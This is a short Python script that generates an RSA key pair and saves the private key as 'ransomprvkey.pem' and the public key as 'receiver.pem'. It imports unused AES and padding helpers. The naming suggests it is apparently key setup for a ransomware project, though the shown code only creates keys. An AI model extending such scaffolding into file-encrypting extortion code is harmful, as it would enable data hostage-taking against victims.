
import os
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode


with open('ransomprvkey.pem', 'wb') as f:
    f.write(RSA.generate(2048).export_key())
    f.close()

with open('receiver.pem', 'wb') as f:
    f.write(RSA.import_key(open('ransomprvkey.pem').read()).publickey().export_key())
    f.close()
